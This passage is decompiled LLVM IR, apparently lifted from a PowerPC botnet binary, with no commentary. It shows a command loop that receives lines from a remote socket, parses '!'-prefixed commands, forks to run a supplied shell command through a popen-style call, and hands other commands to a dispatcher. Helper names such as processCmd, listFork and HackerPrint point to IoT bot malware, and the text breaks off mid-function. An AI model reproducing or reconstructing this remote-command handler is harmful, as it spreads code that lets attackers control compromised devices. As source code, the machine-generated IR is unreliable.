dec_label_pc_1000d154:                            ; preds = %dec_label_pc_1000d128, %dec_label_pc_1000d14c
  %v2_1000d160 = load i8, i8* %v4_1000d5c0, align 4
  %v3_1000d168 = icmp eq i8 %v2_1000d160, 33
  br i1 %v3_1000d168, label %dec_label_pc_1000d18c, label %dec_label_pc_1000d5a8

dec_label_pc_1000d18c:                            ; preds = %dec_label_pc_1000d154, %dec_label_pc_1000d1a0
  %storemerge = phi i32 [ %v1_1000d174, %dec_label_pc_1000d1a0 ], [ %v2_1000d5b0, %dec_label_pc_1000d154 ]
  %v1_1000d174 = add i32 %storemerge, 1
  %storemerge7 = inttoptr i32 %v1_1000d174 to i8*
  %v2_1000d190 = load i8, i8* %storemerge7, align 1
  %v3_1000d198 = icmp eq i8 %v2_1000d190, 32
  br i1 %v3_1000d198, label %dec_label_pc_1000d1b4, label %dec_label_pc_1000d1a0

dec_label_pc_1000d1a0:                            ; preds = %dec_label_pc_1000d18c
  %v2_1000d1a4 = load i8, i8* %storemerge7, align 1
  %v3_1000d1ac = icmp eq i8 %v2_1000d1a4, 0
  br i1 %v3_1000d1ac, label %dec_label_pc_1000d1b4, label %dec_label_pc_1000d18c

dec_label_pc_1000d1b4:                            ; preds = %dec_label_pc_1000d1a0, %dec_label_pc_1000d18c
  %v2_1000d1b8 = load i8, i8* %storemerge7, align 1
  %v3_1000d1c0 = icmp eq i8 %v2_1000d1b8, 0
  br i1 %v3_1000d1c0, label %dec_label_pc_1000d5a8, label %dec_label_pc_1000d1c8

dec_label_pc_1000d1c8:                            ; preds = %dec_label_pc_1000d1b4
  store i8 0, i8* %storemerge7, align 1
  store i32 %v1_1000d1d8, i32* @r3, align 4
  %v0_1000d1e8 = call i32 @__GI_strlen()
  %v2_1000d1f8 = add i32 %v0_1000d1e8, %v2_1000d5b0
  %v1_1000d1fc = add i32 %v2_1000d1f8, 2
  %v2_1000d248 = add i32 %v2_1000d1f8, 1
  br label %dec_label_pc_1000d230

dec_label_pc_1000d208:                            ; preds = %dec_label_pc_1000d260, %dec_label_pc_1000d230
  store i32 %v1_1000d1fc, i32* @r3, align 4
  %v0_1000d210 = call i32 @__GI_strlen()
  %v1_1000d224 = add i32 %v0_1000d210, %v2_1000d248
  %v3_1000d22c = inttoptr i32 %v1_1000d224 to i8*
  store i8 0, i8* %v3_1000d22c, align 1
  br label %dec_label_pc_1000d230

dec_label_pc_1000d230:                            ; preds = %dec_label_pc_1000d1c8, %dec_label_pc_1000d208
  store i32 %v1_1000d1fc, i32* @r3, align 4
  %v0_1000d238 = call i32 @__GI_strlen()
  %v1_1000d24c = add i32 %v0_1000d238, %v2_1000d248
  %v1_1000d250 = inttoptr i32 %v1_1000d24c to i8*
  %v2_1000d250 = load i8, i8* %v1_1000d250, align 1
  %v3_1000d258 = icmp eq i8 %v2_1000d250, 10
  br i1 %v3_1000d258, label %dec_label_pc_1000d208, label %dec_label_pc_1000d260

dec_label_pc_1000d260:                            ; preds = %dec_label_pc_1000d230
  store i32 %v1_1000d1fc, i32* @r3, align 4
  %v0_1000d268 = call i32 @__GI_strlen()
  %v1_1000d27c = add i32 %v0_1000d268, %v2_1000d248
  %v1_1000d280 = inttoptr i32 %v1_1000d27c to i8*
  %v2_1000d280 = load i8, i8* %v1_1000d280, align 1
  %v3_1000d288 = icmp eq i8 %v2_1000d280, 13
  br i1 %v3_1000d288, label %dec_label_pc_1000d208, label %dec_label_pc_1000d2a8.preheader

dec_label_pc_1000d2a8.preheader:                  ; preds = %dec_label_pc_1000d260
  %stack_var_-5284.021 = inttoptr i32 %v1_1000d1fc to i8*
  %v2_1000d2ac22 = load i8, i8* %stack_var_-5284.021, align 1
  %v3_1000d2b426 = icmp eq i8 %v2_1000d2ac22, 32
  br i1 %v3_1000d2b426, label %dec_label_pc_1000d2d0, label %dec_label_pc_1000d2bc

dec_label_pc_1000d29c:                            ; preds = %dec_label_pc_1000d2bc
  %v1_1000d2a0 = add i32 %storemerge2027, 1
  %stack_var_-5284.0 = inttoptr i32 %v1_1000d2a0 to i8*
  %v2_1000d2ac = load i8, i8* %stack_var_-5284.0, align 1
  %v3_1000d2b4 = icmp eq i8 %v2_1000d2ac, 32
  br i1 %v3_1000d2b4, label %dec_label_pc_1000d2d0, label %dec_label_pc_1000d2bc

dec_label_pc_1000d2bc:                            ; preds = %dec_label_pc_1000d2a8.preheader, %dec_label_pc_1000d29c
  %stack_var_-5284.028 = phi i8* [ %stack_var_-5284.0, %dec_label_pc_1000d29c ], [ %stack_var_-5284.021, %dec_label_pc_1000d2a8.preheader ]
  %storemerge2027 = phi i32 [ %v1_1000d2a0, %dec_label_pc_1000d29c ], [ %v1_1000d1fc, %dec_label_pc_1000d2a8.preheader ]
  %v2_1000d2c0 = load i8, i8* %stack_var_-5284.028, align 1
  %v3_1000d2c8 = icmp eq i8 %v2_1000d2c0, 0
  br i1 %v3_1000d2c8, label %dec_label_pc_1000d2d0, label %dec_label_pc_1000d29c

dec_label_pc_1000d2d0:                            ; preds = %dec_label_pc_1000d29c, %dec_label_pc_1000d2bc, %dec_label_pc_1000d2a8.preheader
  %storemerge20.lcssa = phi i32 [ %v1_1000d1fc, %dec_label_pc_1000d2a8.preheader ], [ %v1_1000d2a0, %dec_label_pc_1000d29c ], [ %storemerge2027, %dec_label_pc_1000d2bc ]
  %stack_var_-5284.0.lcssa = phi i8* [ %stack_var_-5284.021, %dec_label_pc_1000d2a8.preheader ], [ %stack_var_-5284.0, %dec_label_pc_1000d29c ], [ %stack_var_-5284.028, %dec_label_pc_1000d2bc ]
  store i8 0, i8* %stack_var_-5284.0.lcssa, align 1
  %v1_1000d2e0 = add i32 %storemerge20.lcssa, 1
  %v2_1000d32c33 = load i8, i8* %stack_var_-5284.021, align 1
  %v3_1000d33436 = icmp eq i8 %v2_1000d32c33, 0
  br i1 %v3_1000d33436, label %dec_label_pc_1000d33c, label %dec_label_pc_1000d2f4

dec_label_pc_1000d2f4:                            ; preds = %dec_label_pc_1000d2d0, %dec_label_pc_1000d2f4
  %storemerge638 = phi i8* [ %storemerge6, %dec_label_pc_1000d2f4 ], [ %stack_var_-5284.021, %dec_label_pc_1000d2d0 ]
  %storemerge1537 = phi i32 [ %v1_1000d320, %dec_label_pc_1000d2f4 ], [ %v1_1000d1fc, %dec_label_pc_1000d2d0 ]
  %v3_1000d2f8 = load i8, i8* %storemerge638, align 1
  %v4_1000d2f8 = zext i8 %v3_1000d2f8 to i32
  store i32 268489484, i32* @lr, align 4
  %v3_1000d308 = call i32 @__GI_toupper(i32 %v4_1000d2f8, i32 %storemerge1537)
  %v1_1000d318 = trunc i32 %v3_1000d308 to i8
  store i8 %v1_1000d318, i8* %storemerge638, align 1
  %v1_1000d320 = add i32 %storemerge1537, 1
  %storemerge6 = inttoptr i32 %v1_1000d320 to i8*
  %v2_1000d32c = load i8, i8* %storemerge6, align 1
  %v3_1000d334 = icmp eq i8 %v2_1000d32c, 0
  br i1 %v3_1000d334, label %dec_label_pc_1000d33c, label %dec_label_pc_1000d2f4

dec_label_pc_1000d33c:                            ; preds = %dec_label_pc_1000d2f4, %dec_label_pc_1000d2d0
  store i32 ptrtoint ([5 x i8]* @global_var_10018f48.570 to i32), i32* @r4, align 4
  %v4_1000d34c = call i32 @__GI_strcoll(i8* %stack_var_-5284.021, i32 ptrtoint ([5 x i8]* @global_var_10018f48.570 to i32))
  %v3_1000d354 = icmp eq i32 %v4_1000d34c, 0
  br i1 %v3_1000d354, label %dec_label_pc_1000d35c, label %dec_label_pc_1000d424

dec_label_pc_1000d35c:                            ; preds = %dec_label_pc_1000d33c
  store i32 268489568, i32* @lr, align 4
  %v0_1000d35c = call i32 @listFork()
  %v3_1000d364 = icmp eq i32 %v0_1000d35c, 0
  br i1 %v3_1000d364, label %dec_label_pc_1000d36c, label %dec_label_pc_1000d5a8

dec_label_pc_1000d36c:                            ; preds = %dec_label_pc_1000d35c
  store i32 268489604, i32* @lr, align 4
  %v3_1000d380 = call i32 @__GI_memset(i32 %v2_1000d36c, i32 0, i32 1024)
  %v4_1000d3a0 = call i32 @szprintf(i32 %v2_1000d36c, i32 ptrtoint ([8 x i8]* @global_var_10018f50.571 to i32), i32 %v1_1000d2e0)
  store i32 268489660, i32* @lr, align 4
  %v3_1000d3b8 = call i32 @fdpopen(i32 %v2_1000d36c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_10018f58.572, i32 0, i32 0))
  br label %dec_label_pc_1000d3f4

dec_label_pc_1000d3c8:                            ; preds = %dec_label_pc_1000d3f4
  %v1_1000d3d0 = call i32 @trim(i32 %v2_1000d36c)
  store i32 ptrtoint ([3 x i8]* @global_var_1000d3ec.573 to i32), i32* @lr, align 4
  %v3_1000d3e8 = call i32 @__GI_memset(i32 %v2_1000d36c, i32 0, i32 1024)
  store i32 268489716, i32* @lr, align 4
  %v1_1000d3f0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_1000d3f4

dec_label_pc_1000d3f4:                            ; preds = %dec_label_pc_1000d36c, %dec_label_pc_1000d3c8
  %v3_1000d404 = call i32 @fdgets(i32 %v2_1000d36c, i32 1024, i32 %v3_1000d3b8)
  %v3_1000d40c = icmp eq i32 %v3_1000d404, 0
  br i1 %v3_1000d40c, label %dec_label_pc_1000d414, label %dec_label_pc_1000d3c8

dec_label_pc_1000d414:                            ; preds = %dec_label_pc_1000d3f4
  %v1_1000d418 = call i32 @fdpclose(i32 %v3_1000d3b8)
  %v0_1000d420 = call i32 @__GI_exit()
  br label %dec_label_pc_1000d424

dec_label_pc_1000d424:                            ; preds = %dec_label_pc_1000d33c, %dec_label_pc_1000d414
  store i32 ptrtoint (i32* @global_var_10018f5c.576 to i32), i32* @r4, align 4
  store i32 268489792, i32* @lr, align 4
  %v3_1000d43c = call i32 @__GI_strtok(i32 %v1_1000d2e0, i32 ptrtoint (i32* @global_var_10018f5c.576 to i32), i32 268566528)
  store i32 %v1_1000d1fc, i32* %stack_var_-5252, align 4
  %v3_1000d53442 = icmp eq i32 %v3_1000d43c, 0
  br i1 %v3_1000d53442, label %dec_label_pc_1000d53c, label %dec_label_pc_1000d454

dec_label_pc_1000d454:                            ; preds = %dec_label_pc_1000d424, %dec_label_pc_1000d518
  %stack_var_-5312.045.in = phi i32 [ %v3_1000d524, %dec_label_pc_1000d518 ], [ %v3_1000d43c, %dec_label_pc_1000d424 ]
  %stack_var_-5308.143 = phi i32 [ %stack_var_-5308.0, %dec_label_pc_1000d518 ], [ 1, %dec_label_pc_1000d424 ]
  %stack_var_-5312.045 = inttoptr i32 %stack_var_-5312.045.in to i8*
  %v2_1000d458 = load i8, i8* %stack_var_-5312.045, align 1
  %v3_1000d460 = icmp eq i8 %v2_1000d458, 10
  br i1 %v3_1000d460, label %dec_label_pc_1000d518, label %dec_label_pc_1000d468

dec_label_pc_1000d468:                            ; preds = %dec_label_pc_1000d454
  store i32 %stack_var_-5308.143, i32* @r29, align 4
  store i32 %stack_var_-5312.045.in, i32* @r3, align 4
  %v0_1000d474 = call i32 @__GI_strlen()
  %v1_1000d47c = add i32 %v0_1000d474, 1
  store i32 268489864, i32* @lr, align 4
  %v1_1000d484 = call i32 @malloc(i32 %v1_1000d47c)
  %v0_1000d490 = load i32, i32* @r29, align 4
  %v1_1000d490 = mul i32 %v0_1000d490, 4
  %v1_1000d49c = add i32 %v1_1000d490, %v2_1000d578
  %v2_1000d4a0 = inttoptr i32 %v1_1000d49c to i32*
  store i32 %v1_1000d484, i32* %v2_1000d4a0, align 4
  %v1_1000d4a8 = mul i32 %stack_var_-5308.143, 4
  %v1_1000d4b4 = add i32 %v1_1000d4a8, %v2_1000d578
  %v1_1000d4b8 = inttoptr i32 %v1_1000d4b4 to i32*
  %v2_1000d4b8 = load i32, i32* %v1_1000d4b8, align 4
  store i32 %stack_var_-5312.045.in, i32* @r3, align 4
  %v0_1000d4c4 = call i32 @__GI_strlen()
  %v1_1000d4cc = add i32 %v0_1000d4c4, 1
  store i32 268489956, i32* @lr, align 4
  %v3_1000d4e0 = call i32 @__GI_memset(i32 %v2_1000d4b8, i32 0, i32 %v1_1000d4cc)
  %v2_1000d4f8 = load i32, i32* %v1_1000d4b8, align 4
  %v4_1000d508 = call i32 @strcpy(i32 %v2_1000d4f8, i8* nonnull %stack_var_-5312.045)
  %v1_1000d510 = add i32 %stack_var_-5308.143, 1
  br label %dec_label_pc_1000d518

dec_label_pc_1000d518:                            ; preds = %dec_label_pc_1000d454, %dec_label_pc_1000d468
  %stack_var_-5308.0 = phi i32 [ %stack_var_-5308.143, %dec_label_pc_1000d454 ], [ %v1_1000d510, %dec_label_pc_1000d468 ]
  store i32 ptrtoint (i32* @global_var_10018f5c.576 to i32), i32* @r4, align 4
  store i32 268490024, i32* @lr, align 4
  %v3_1000d524 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018f5c.576 to i32), i32 268566528)
  %v3_1000d534 = icmp eq i32 %v3_1000d524, 0
  br i1 %v3_1000d534, label %dec_label_pc_1000d53c, label %dec_label_pc_1000d454

dec_label_pc_1000d53c:                            ; preds = %dec_label_pc_1000d518, %dec_label_pc_1000d424
  %stack_var_-5308.1.lcssa = phi i32 [ 1, %dec_label_pc_1000d424 ], [ %stack_var_-5308.0, %dec_label_pc_1000d518 ]
  store i32 268490060, i32* @lr, align 4
  %v3_1000d548 = call i32 @processCmd(i32 %stack_var_-5308.1.lcssa, i32* nonnull %stack_var_-5252)
  %tmp96 = icmp slt i32 %stack_var_-5308.1.lcssa, 2
  br i1 %tmp96, label %dec_label_pc_1000d5a8, label %dec_label_pc_1000d56c.lr.ph

dec_label_pc_1000d56c.lr.ph:                      ; preds = %dec_label_pc_1000d53c
  store i32 1, i32* %stack_var_-5320, align 4
  br label %dec_label_pc_1000d56c

dec_label_pc_1000d56c:                            ; preds = %dec_label_pc_1000d56c.lr.ph, %dec_label_pc_1000d56c
  %v3_1000d56c = phi i32 [ 1, %dec_label_pc_1000d56c.lr.ph ], [ %v1_1000d590, %dec_label_pc_1000d56c ]
  %v1_1000d570 = mul i32 %v3_1000d56c, 4
  %v1_1000d57c = add i32 %v1_1000d570, %v2_1000d578
  %v1_1000d580 = inttoptr i32 %v1_1000d57c to i32*
  %v2_1000d580 = load i32, i32* %v1_1000d580, align 4
  store i32 268490124, i32* @lr, align 4
  %v1_1000d588 = call i32 @free(i32 %v2_1000d580)
  %v3_1000d58c = load i32, i32* %stack_var_-5320, align 4
  %v1_1000d590 = add i32 %v3_1000d58c, 1
  store i32 %v1_1000d590, i32* %stack_var_-5320, align 4
  %v2_1000d5a0 = icmp slt i32 %v1_1000d590, %stack_var_-5308.1.lcssa
  br i1 %v2_1000d5a0, label %dec_label_pc_1000d56c, label %dec_label_pc_1000d5a8

dec_label_pc_1000d5a8:                            ; preds = %dec_label_pc_1000d56c, %dec_label_pc_1000d35c, %dec_label_pc_1000d154, %dec_label_pc_1000d53c, %dec_label_pc_1000d1b4, %dec_label_pc_1000d108, %dec_label_pc_1000cd90
  %v3_1000d5ac = load i32, i32* @global_var_1002aba8.30, align 4
  %v5_1000d5c0 = call i32 @recvLine(i32 %v3_1000d5ac, i8* %v4_1000d5c0, i32 4096, i32 %v2_1000d5b0)
  %v4_1000d5d4 = icmp eq i32 %v5_1000d5c0, -1
  br i1 %v4_1000d5d4, label %dec_label_pc_1000cd74, label %dec_label_pc_1000d058

; uselistorder directives
  uselistorder i32 %v5_1000d5c0, { 1, 0 }
  uselistorder i32 %v1_1000d590, { 1, 2, 0 }
  uselistorder i32 %stack_var_-5308.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v3_1000d524, { 1, 0 }
  uselistorder i8* %stack_var_-5312.045, { 1, 0 }
  uselistorder i32 %stack_var_-5308.143, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge6, { 1, 0 }
  uselistorder i32 %v1_1000d320, { 1, 0 }
  uselistorder i32 %storemerge1537, { 1, 0 }
  uselistorder i8* %storemerge638, { 1, 0 }
  uselistorder i32 %v1_1000d2e0, { 1, 0 }
  uselistorder i8* %stack_var_-5284.021, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_1000d1fc, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i32 %v1_1000d174, { 1, 0 }
  uselistorder i32 %v2_1000d084, { 1, 0 }
  uselistorder i32 %storemerge13, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32 %storemerge18, { 1, 0, 2 }
  uselistorder i32 %v1_1000cf8c, { 1, 0 }
  uselistorder i32 %v1_1000cf70, { 1, 0 }
  uselistorder i32 %v3_1000cf24, { 1, 0 }
  uselistorder i32 %v1_1000ce3c, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1000d36c, { 3, 1, 2, 4, 0, 5 }
  uselistorder i8* %v4_1000d5c0, { 1, 0 }
  uselistorder i32 %v2_1000d5b0, { 3, 1, 0, 4, 5, 6, 7, 8, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-5320, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 19, 18, 17, 16, 15, 14, 8, 7, 6, 5, 4, 3, 2, 1, 0, 13, 12, 11, 10, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_10018f5c.576 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24 }
  uselistorder i32 ()* @listFork, { 18, 17, 16, 15, 14, 13, 8, 7, 6, 5, 4, 3, 2, 1, 0, 12, 11, 10, 9 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @trim, { 1, 0 }
  uselistorder i32* @global_var_1002abb0.38, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32 (i32, i32, i32)* @HackerPrint, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 24, 23, 22, 0, 21, 20, 1, 19, 18, 17, 16, 2, 15, 14, 13, 12, 11, 10, 9, 8, 7, 3, 6, 5, 4 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @access, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5a8, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_1000d56c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d518, { 1, 0 }
  uselistorder label %dec_label_pc_1000d454, { 1, 0 }
  uselistorder label %dec_label_pc_1000d424, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d2f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d2d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d2bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d230, { 1, 0 }
  uselistorder label %dec_label_pc_1000d18c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d154, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d04c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cfc8, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf88, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce90, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce48, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cd54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cbfc, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_1000d5f0 = icmp eq i32 %arg2, -2143521772
  %v2_1000d604 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000d604, i32* %stack_var_-32, align 4
  br i1 %v4_1000d5f0, label %dec_label_pc_1000d664, label %dec_label_pc_1000d624

dec_label_pc_1000d624:                            ; preds = %entry
  %v3_1000d624 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000d624, label %dec_label_pc_1000d63c, label %dec_label_pc_1000d62c

dec_label_pc_1000d62c:                            ; preds = %dec_label_pc_1000d624
  %v3_1000d630 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_1000d630, label %dec_label_pc_1000d658, label %dec_label_pc_1000d684

dec_label_pc_1000d63c:                            ; preds = %dec_label_pc_1000d624
  %v1_1000d63c = xor i32 %arg2, -2143551488
  %v3_1000d640 = icmp eq i32 %v1_1000d63c, 29717
  br i1 %v3_1000d640, label %dec_label_pc_1000d674, label %dec_label_pc_1000d648

dec_label_pc_1000d648:                            ; preds = %dec_label_pc_1000d63c
  %v3_1000d64c = icmp eq i32 %v1_1000d63c, 29718
  br i1 %v3_1000d64c, label %dec_label_pc_1000d67c, label %dec_label_pc_1000d684

dec_label_pc_1000d658:                            ; preds = %dec_label_pc_1000d62c
  store i32 ptrtoint (i32* @global_var_1000d660.577 to i32), i32* @lr, align 4
  %v1_1000d65c = inttoptr i32 %arg3 to i32*
  %v2_1000d65c = call i32 @__GI_tcgetattr(i32* %v1_1000d65c)
  br label %dec_label_pc_1000d66c

dec_label_pc_1000d664:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1000d668

dec_label_pc_1000d668:                            ; preds = %dec_label_pc_1000d67c, %dec_label_pc_1000d674, %dec_label_pc_1000d664
  store i32 268490348, i32* @lr, align 4
  %v0_1000d668 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_1000d66c

dec_label_pc_1000d66c:                            ; preds = %dec_label_pc_1000d658, %dec_label_pc_1000d668
  %storemerge = phi i32 [ %v0_1000d668, %dec_label_pc_1000d668 ], [ %v2_1000d65c, %dec_label_pc_1000d658 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d6b0

dec_label_pc_1000d674:                            ; preds = %dec_label_pc_1000d63c
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1000d668

dec_label_pc_1000d67c:                            ; preds = %dec_label_pc_1000d648
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_1000d668

dec_label_pc_1000d684:                            ; preds = %dec_label_pc_1000d648, %dec_label_pc_1000d62c
  %v0_1000d694 = call i32 @__asm_mfcr()
  %v1_1000d698 = and i32 %v0_1000d694, 268435456
  %v3_1000d698 = icmp eq i32 %v1_1000d698, 0
  store i32 %v0_1000d694, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d698, label %dec_label_pc_1000d6b0, label %dec_label_pc_1000d6a4

dec_label_pc_1000d6a4:                            ; preds = %dec_label_pc_1000d684
  %v0_1000d6a4 = call i32 @__errno_location()
  %v0_1000d6a8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d6a8 = inttoptr i32 %v0_1000d6a4 to i32*
  store i32 %v0_1000d6a8, i32* %v2_1000d6a8, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d6b0

dec_label_pc_1000d6b0:                            ; preds = %dec_label_pc_1000d684, %dec_label_pc_1000d66c, %dec_label_pc_1000d6a4
  %v0_1000d6b4 = phi i32 [ %v0_1000d694, %dec_label_pc_1000d684 ], [ %storemerge, %dec_label_pc_1000d66c ], [ -1, %dec_label_pc_1000d6a4 ]
  ret i32 %v0_1000d6b4

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000d6b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d66c, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_1000d6d0 = load i32, i32* @lr, align 4
  %v1_1000d6d0 = load i1, i1* @cr0_so, align 1
  %v2_1000d6d0 = xor i1 %v1_1000d6d0, true
  call void @__pseudo_cond_branch(i1 %v2_1000d6d0, i32 %v0_1000d6d0)
  %v0_1000d6d4 = call i32 @__syscall_error()
  ret i32 %v0_1000d6d4
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000d6ec = add i32 %arg2, -12
  %v2_1000d6f0 = icmp ugt i32 %v1_1000d6ec, 2
  %v2_1000d6f8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000d6f8, i32* %stack_var_-32, align 4
  br i1 %v2_1000d6f0, label %dec_label_pc_1000d724, label %dec_label_pc_1000d714

dec_label_pc_1000d714:                            ; preds = %entry
  store i32 268490524, i32* @lr, align 4
  %v2_1000d718 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_1000d718, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d744

dec_label_pc_1000d724:                            ; preds = %entry
  %v0_1000d728 = call i32 @__asm_mfcr()
  %v1_1000d72c = and i32 %v0_1000d728, 268435456
  %v3_1000d72c = icmp eq i32 %v1_1000d72c, 0
  store i32 %v0_1000d728, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d72c, label %dec_label_pc_1000d744, label %dec_label_pc_1000d738

dec_label_pc_1000d738:                            ; preds = %dec_label_pc_1000d724
  %v0_1000d738 = call i32 @__errno_location()
  %v0_1000d73c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d73c = inttoptr i32 %v0_1000d738 to i32*
  store i32 %v0_1000d73c, i32* %v2_1000d73c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d744

dec_label_pc_1000d744:                            ; preds = %dec_label_pc_1000d724, %dec_label_pc_1000d714, %dec_label_pc_1000d738
  %v0_1000d748 = phi i32 [ %v0_1000d728, %dec_label_pc_1000d724 ], [ %v2_1000d718, %dec_label_pc_1000d714 ], [ -1, %dec_label_pc_1000d738 ]
  ret i32 %v0_1000d748

; uselistorder directives
  uselistorder label %dec_label_pc_1000d744, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000d774 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000d774, i32* %stack_var_-32, align 4
  %v0_1000d790 = call i32 @__asm_mfcr()
  %v1_1000d794 = and i32 %v0_1000d790, 268435456
  %v3_1000d794 = icmp eq i32 %v1_1000d794, 0
  store i32 %v0_1000d790, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d794, label %dec_label_pc_1000d7ac, label %dec_label_pc_1000d7a0

dec_label_pc_1000d7a0:                            ; preds = %entry
  %v0_1000d7a0 = call i32 @__errno_location()
  %v0_1000d7a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d7a4 = inttoptr i32 %v0_1000d7a0 to i32*
  store i32 %v0_1000d7a4, i32* %v2_1000d7a4, align 4
  br label %dec_label_pc_1000d7ac

dec_label_pc_1000d7ac:                            ; preds = %entry, %dec_label_pc_1000d7a0
  %v0_1000d7bc = phi i32 [ %v0_1000d790, %entry ], [ -1, %dec_label_pc_1000d7a0 ]
  ret i32 %v0_1000d7bc

; uselistorder directives
  uselistorder label %dec_label_pc_1000d7ac, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_1000d7d4

dec_label_pc_1000d7d4:                            ; preds = %dec_label_pc_1000d7d4.backedge, %entry
  %v0_1000d7e0 = call i32 @__asm_mfcr()
  %v1_1000d7e4 = and i32 %v0_1000d7e0, 268435456
  %v3_1000d7e4 = icmp eq i32 %v1_1000d7e4, 0
  store i32 %v0_1000d7e0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d7e4, label %dec_label_pc_1000d7d4.backedge, label %dec_label_pc_1000d7f0

